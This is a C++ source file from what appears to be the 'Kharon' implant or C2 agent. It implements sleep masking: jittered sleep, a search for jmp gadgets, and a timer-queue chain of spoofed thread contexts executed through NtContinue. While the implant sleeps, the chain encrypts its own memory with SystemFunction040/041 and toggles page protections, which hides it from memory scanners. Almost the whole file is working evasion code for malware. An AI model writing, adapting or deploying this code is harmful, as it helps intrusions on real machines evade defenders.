#include <Kharon.h>

using namespace Root;

auto DECLFN Mask::Main(
    _In_ ULONG Time
) -> BOOL {

    ULONG JitterMnt = ( Kh->Session.Jitter * Kh->Session.SleepTime ) / 100; 
    ULONG SleepMin  = ( Kh->Session.SleepTime > JitterMnt ? Kh->Session.SleepTime - JitterMnt : 0 ); 
    ULONG SleepMax  = ( Kh->Session.SleepTime + JitterMnt );
    ULONG Range     = ( SleepMax - SleepMin + 1 );
    ULONG RndTime   = ( Rnd32() % Range ); 

    KhDbg( "sleep during: %d", RndTime );

    switch( Kh->Mk->Ctx.TechniqueID ) {
    case MaskTimer:
        return Kh->Mk->Timer( RndTime );
    case MaskApc:
        return Kh->Mk->Apc( RndTime );
    case MaskWait:
        return Kh->Mk->Wait( RndTime );
    }
}

auto DECLFN Mask::FindGadget(
    _In_ UPTR   ModuleBase,
    _In_ UINT16 RegValue
) -> UPTR {
    UPTR   Gadget      = 0;
    PBYTE  SearchBase  = NULL;
    SIZE_T SearchSize  = 0;
    UINT16 JmpValue    = 0xff;

    SearchBase = B_PTR( ModuleBase + 0x1000 );
    SearchSize = 0x1000 * 0x1000;    

    for ( INT i = 0; i < SearchSize - 1; i++ ) {
        if ( SearchBase[i] == JmpValue && SearchBase[i+1] == RegValue ) {
            Gadget = U_PTR( SearchBase + i ); break;
        }
    }

    return Gadget;
}

auto DECLFN Mask::Timer(
    _In_ ULONG Time
) -> BOOL {
    NTSTATUS NtStatus = 0;
    
    ULONG  DupThreadId      = Kh->Td->RndEnum();
    HANDLE DupThreadHandle  = NULL;
    HANDLE MainThreadHandle = NULL;

    HANDLE Queue       = NULL;
    HANDLE Timer       = NULL;
    HANDLE EventTimer  = NULL;
    HANDLE EventStart  = NULL;
    HANDLE EventEnd    = NULL;

    PVOID OldProtection = NULL;
    ULONG DelayTimer    = 0;
    BOOL  bSuccess      = FALSE;

    CONTEXT CtxMain = { 0 };
    CONTEXT CtxSpf  = { 0 };
    CONTEXT CtxBkp  = { 0 };

    CONTEXT Ctx[10]  = { 0 };
    UINT16  ic       = 0;

    BYTE Key[16] = { 0 };

    KhDbg( "kharon base at %p [0x%X bytes]", Kh->Session.Base.Start, Kh->Session.Base.Length );
    KhDbg( "running at thread id: %d thread id to duplicate: %d", Kh->Session.ThreadID, DupThreadId );
    KhDbg( "NtContinue gadget at %p", Kh->Mk->Ctx.NtContinueGadget );
    KhDbg( "jmp gadget at %p", Kh->Mk->Ctx.JmpGadget );

    DupThreadHandle = Kh->Td->Open( THREAD_ALL_ACCESS, FALSE, DupThreadId );

    NtStatus = Kh->Krnl32.DuplicateHandle( NtCurrentProcess(), NtCurrentThread(), NtCurrentProcess(), &MainThreadHandle, THREAD_ALL_ACCESS, FALSE, 0 );

    NtStatus = Kh->Ntdll.NtCreateEvent( &EventTimer,  EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE );
    NtStatus = Kh->Ntdll.NtCreateEvent( &EventStart,  EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE );
    NtStatus = Kh->Ntdll.NtCreateEvent( &EventEnd,    EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE );

    NtStatus = Kh->Ntdll.RtlCreateTimerQueue( &Queue );
    if ( NtStatus != STATUS_SUCCESS ) goto _KH_END;

    NtStatus = Kh->Ntdll.RtlCreateTimer( Queue, &Timer, (WAITORTIMERCALLBACKFUNC)Kh->Ntdll.RtlCaptureContext, &CtxMain, DelayTimer += 100, 0, WT_EXECUTEINTIMERTHREAD );
    if ( NtStatus != STATUS_SUCCESS ) goto _KH_END;

    NtStatus = Kh->Ntdll.RtlCreateTimer( Queue, &Timer, (WAITORTIMERCALLBACKFUNC)Kh->Krnl32.SetEvent, EventTimer, DelayTimer += 100, 0, WT_EXECUTEINTIMERTHREAD );
    if ( NtStatus != STATUS_SUCCESS ) goto _KH_END;

    NtStatus = Kh->Ntdll.NtWaitForSingleObject( EventTimer, FALSE, NULL ); 
    if ( NtStatus != STATUS_SUCCESS ) goto _KH_END;

    CtxSpf.ContextFlags = CtxBkp.ContextFlags = CONTEXT_ALL;

    Kh->Ntdll.NtGetContextThread( DupThreadHandle, &CtxSpf );

    for ( INT i = 0; i < 10; i++ ) {
        Mem::Copy( &Ctx[i], &CtxMain, sizeof( CONTEXT ) );
        Ctx[i].Rsp -= sizeof( PVOID );
    }

    Ctx[ic].Rip = U_PTR( Kh->Mk->Ctx.JmpGadget );
    Ctx[ic].Rbx = U_PTR( &Kh->Ntdll.NtWaitForSingleObject );
    Ctx[ic].Rcx = U_PTR( EventStart );
    Ctx[ic].Rdx = FALSE;
    Ctx[ic].R9  = NULL;
    ic++;

    Ctx[ic].Rip = U_PTR( Kh->Mk->Ctx.JmpGadget );
    Ctx[ic].Rbx = U_PTR( &Kh->Ntdll.NtGetContextThread );
    Ctx[ic].Rcx = U_PTR( MainThreadHandle );
    Ctx[ic].Rdx = U_PTR( &CtxBkp );
    ic++;

    Ctx[ic].Rip = U_PTR( Kh->Mk->Ctx.JmpGadget ) ;
    Ctx[ic].Rbx = U_PTR( &Kh->Ntdll.NtSetContextThread ); 
    Ctx[ic].Rcx = U_PTR( MainThreadHandle );
    Ctx[ic].Rdx = U_PTR( &CtxSpf );
    ic++;

    Ctx[ic].Rip = U_PTR( Kh->Mk->Ctx.JmpGadget );
    Ctx[ic].Rbx = U_PTR( &Kh->Krnl32.VirtualProtect );
    Ctx[ic].Rcx = U_PTR( Kh->Session.Base.Start );
    Ctx[ic].Rdx = Kh->Session.Base.Length;
    Ctx[ic].R8  = PAGE_READWRITE;
    Ctx[ic].R9  = U_PTR( &OldProtection );
    ic++;

    Ctx[ic].Rip = U_PTR( Kh->Mk->Ctx.JmpGadget );
    Ctx[ic].Rbx = U_PTR( &Kh->Cryptbase.SystemFunction040 );
    Ctx[ic].Rcx = U_PTR( Kh->Session.Base.Start );
    Ctx[ic].Rdx = Kh->Session.Base.Length;
    ic++;
    
    Ctx[ic].Rip = U_PTR( Kh->Mk->Ctx.JmpGadget );
    Ctx[ic].Rbx = U_PTR( &Kh->Krnl32.WaitForSingleObjectEx );
    Ctx[ic].Rcx = U_PTR( NtCurrentProcess() );
    Ctx[ic].Rdx = Time;
    Ctx[ic].R8  = FALSE;
    ic++;
        
    Ctx[ic].Rip = U_PTR( Kh->Mk->Ctx.JmpGadget );
    Ctx[ic].Rbx = U_PTR( &Kh->Cryptbase.SystemFunction041 );
    Ctx[ic].Rcx = U_PTR( Kh->Session.Base.Start );
    Ctx[ic].Rdx = Kh->Session.Base.Length;
    ic++;

    Ctx[ic].Rip = U_PTR( Kh->Mk->Ctx.JmpGadget );
    Ctx[ic].Rbx = U_PTR( &Kh->Krnl32.VirtualProtect );
    Ctx[ic].Rcx = U_PTR( Kh->Session.Base.Start );
    Ctx[ic].Rdx = Kh->Session.Base.Length;
    Ctx[ic].R8  = PAGE_EXECUTE_READ;
    Ctx[ic].R9  = U_PTR( &OldProtection );
    ic++;

    Ctx[ic].Rip = U_PTR( Kh->Mk->Ctx.JmpGadget );
    Ctx[ic].Rbx = U_PTR( &Kh->Ntdll.NtSetContextThread );
    Ctx[ic].Rcx = U_PTR( MainThreadHandle );
    Ctx[ic].Rdx = U_PTR( &CtxBkp );
    ic++;

    Ctx[ic].Rip = U_PTR( Kh->Mk->Ctx.JmpGadget );
    Ctx[ic].Rbx = U_PTR( &Kh->Krnl32.SetEvent );
    Ctx[ic].Rcx = U_PTR( EventEnd );
    ic++;

    for ( INT i = 0; i < ic; i++ ) {
        Kh->Ntdll.RtlCreateTimer( Queue, &Timer, (WAITORTIMERCALLBACKFUNC)Kh->Mk->Ctx.NtContinueGadget, &Ctx[i], DelayTimer += 100, 0, WT_EXECUTEINTIMERTHREAD );
    }

    KhDbg( "trigger obf chain\n\n" );

    NtStatus = Kh->Ntdll.NtSignalAndWaitForSingleObject( EventStart, EventEnd, FALSE, NULL );
    if ( NtStatus != STATUS_SUCCESS ) goto _KH_END;

_KH_END:
    if ( DupThreadHandle ) Kh->Ntdll.NtClose( DupThreadHandle );
    if ( Timer           ) Kh->Ntdll.RtlDeleteTimer( Queue, Timer, EventTimer );
    if ( Queue           ) Kh->Ntdll.RtlDeleteTimerQueue( Queue );
    if ( EventEnd        ) Kh->Ntdll.NtClose( EventEnd  );
    if ( EventStart      ) Kh->Ntdll.NtClose( EventStart );
    if ( EventTimer      ) Kh->Ntdll.NtClose( EventTimer  );

    return TRUE;
}

auto DECLFN Mask::Apc(
    _In_ ULONG Time
) -> BOOL {

}

auto DECLFN Mask::Wait(
    _In_ ULONG Time
) -> BOOL {
    return Kh->Krnl32.WaitForSingleObject( NtCurrentProcess(), Time );
}